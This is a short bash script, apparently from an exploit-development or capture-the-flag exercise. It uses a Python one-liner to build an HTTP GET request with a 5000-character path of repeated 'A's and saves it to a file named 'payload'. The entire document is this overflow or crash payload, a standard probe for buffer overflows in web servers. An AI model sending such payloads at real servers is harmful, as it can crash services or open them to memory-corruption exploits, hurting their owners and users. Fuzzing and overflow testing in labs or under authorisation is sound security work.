#!/bin/bash

python3 -c 'print("GET " + "A"*5000 + " HTTP/1.1\r\n\r\n")' > payload
